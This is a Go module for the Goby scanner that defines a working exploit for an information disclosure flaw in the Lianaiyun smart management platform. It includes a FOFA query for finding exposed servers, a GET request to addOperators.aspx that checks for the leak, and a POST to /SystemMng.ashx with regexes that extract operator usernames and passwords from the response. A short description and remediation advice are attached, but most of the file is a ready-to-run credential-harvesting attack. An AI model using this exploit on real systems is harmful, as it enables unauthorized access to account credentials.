package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Lianaiyun Smart Platform /View/Operators/addOperators.aspx Information Disclosure Vulnerability",
    "Description": "<p>The Face Love Cloud One Face Tong Intelligent Management Platform is a powerful, stable, easy to operate, aesthetically pleasing user interface, and easy-to-use One Face Tong system for data statistics. No installation required, just configure in the background to log in through the browser.</p><p>Lianaiyun Smart Platform has an information disclosure vulnerability. Attackers can use the addOperators interface to read sensitive information on the server, such as account passwords and user roles, which may lead to sensitive information leakage and reduced system security.</p>",
    "Product": "Lianaiyun Smart Platform",
    "Homepage": "http://www.szjocat.com/index.php/laypt/",
    "DisclosureDate": "2024-11-28",
    "PostTime": "2024-11-28",
    "Author": "1638690747@qq.com",
    "FofaQuery": "body=\"UserReservedTest.aspx\" && body=\"View/UserReserved/\"",
    "GobyQuery": "body=\"UserReservedTest.aspx\" && body=\"View/UserReserved/\"",
    "Level": "1",
    "Impact": "<p>This vulnerability allows attackers to read sensitive information through unauthorized access, potentially leading to user data leakage, privilege escalation, and further attacks.</p>",
    "Recommendation": "<p>It is recommended to immediately disable the addOperators interface or implement strict permission verification to ensure that only authorized users can access it. Additionally, regularly check system logs to identify potential abnormal behavior.</p>",
    "References": [
        "https://blog.csdn.net/qq_44905116/article/details/140326790"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "username",
            "type": "input",
            "value": "admin",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/View/Operators/addOperators.aspx?username=admin",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "operatorPwd",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/View/Operators/addOperators.aspx?username=admin"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/SystemMng.ashx",
                "follow_redirect": true,
                "header": {
                    "Content-Length": "36",
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.57 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "username={{{username}}}&funcName=SelOperators"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "password",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "username|lastbody|regex|username\\\\\":\\\\\"([^'][\\s\\S]*?)\\\\\",\\\\\"pass",
                "password|lastbody|regex|password\\\\\":\\\\\"([^'][\\s\\S]*?)\\\\\",\\\\\"peop",
                "output|lastbody|variable|username:{{{username}}}{{{LF}}}password:{{{password}}}"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6",
    "Translation": {
        "CN": {
            "Name": "脸爱云一脸通智慧平台 /View/Operators/addOperators.aspx 信息泄露漏洞",
            "Product": "脸爱云一脸通智慧平台",
            "Description": "<p>脸爱云一脸通智慧管理平台是一套功能强大，运行稳定，操作简单方便，用户界面美观，轻松统计数据的一脸通系统。无需安装，只需在后台配置即可在浏览器登录。<br></p><p>脸爱云一脸通智慧平台存在一个信息泄露漏洞，攻击者可以通过addOperators接口读取服务器上的敏感信息，例如账号密码和用户角色等，可能导致敏感信息泄露和系统安全性降低。</p>",
            "Recommendation": "<p>建议立即关闭addOperators接口，或者对该接口进行严格的权限验证，确保只有授权用户可以访问。同时，定期检查系统日志以发现潜在的异常行为。</p>",
            "Impact": "<p>该漏洞允许攻击者通过未授权访问读取敏感信息，可能导致用户数据泄露、权限提升以及进一步的攻击。</p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Lianaiyun Smart Platform /View/Operators/addOperators.aspx Information Disclosure Vulnerability",
            "Product": "Lianaiyun Smart Platform",
            "Description": "<p>The Face Love Cloud One Face Tong Intelligent Management Platform is a powerful, stable, easy to operate, aesthetically pleasing user interface, and easy-to-use One Face Tong system for data statistics. No installation required, just configure in the background to log in through the browser.<br></p><p>Lianaiyun Smart Platform has an information disclosure vulnerability. Attackers can use the addOperators interface to read sensitive information on the server, such as account passwords and user roles, which may lead to sensitive information leakage and reduced system security.</p>",
            "Recommendation": "<p>It is recommended to immediately disable the addOperators interface or implement strict permission verification to ensure that only authorized users can access it. Additionally, regularly check system logs to identify potential abnormal behavior.</p>",
            "Impact": "<p>This vulnerability allows attackers to read sensitive information through unauthorized access, potentially leading to user data leakage, privilege escalation, and further attacks.</p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "VariablesOrder": [],
    "EditType": "fast",
    "PocId": "9974"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}